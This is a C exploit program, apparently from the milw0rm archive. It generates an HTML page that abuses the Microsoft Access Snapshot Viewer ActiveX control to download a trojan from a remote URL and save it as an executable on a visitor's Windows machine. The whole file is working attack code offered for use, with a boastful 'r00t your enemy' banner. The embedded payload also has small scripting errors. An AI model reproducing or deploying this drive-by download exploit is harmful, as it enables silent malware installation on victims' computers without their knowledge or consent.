/* Microsoft Access Snapshot Viewer ActiveX Control Exploit
   Ms-Access SnapShot Exploit Snapview.ocx v 10.0.5529.0
   Download nice binaries into an arbitrary box
   Vulnerability discovered by Oliver Lavery 
   http://www.securityfocus.com/bid/8536/info
   Remote: Yes
   greetz to str0ke */

#include <stdio.h>
#include <stdlib.h>


#define Filename        "Ms-Access-SnapShot.html"


FILE *File;
char data[] = "<html>\n<objectclassid='clsid:F0E42D50-368C-11D0-AD81-00A0C90DC8D9'id='attack'></object>\n"
              "<script language='javascript'>\nvar arbitrary_file = 'http://path_to_trojan'\n"
              "var dest = 'C:/Docume~1/ALLUSE~1/trojan.exe'\nattack.SnapshotPath = arbitrary_file\n"
              "attack.CompressedPath = destination\nattack.PrintSnapshot(arbitrary_file,destination)\n"
              "<script>\n<html>";

int main ()
{
        printf("**Microsoft Access Snapshot Viewer ActiveX Exploit**\n");
        printf("**c0ded by callAX**\n");
        printf("**r00t your enemy .| **");

        char *b0fer;

        if ( (File = fopen(Filename,"w")) == NULL ) {
                printf("\n fopen() error");
                exit(1);
        }

        b0fer = (char*)malloc(strlen(data));

        fwrite(data, strlen(data), 1,File);
        fclose(File);

        printf("\n\n" Filename " has been created.\n");
        return 0;
}

// milw0rm.com [2008-07-24]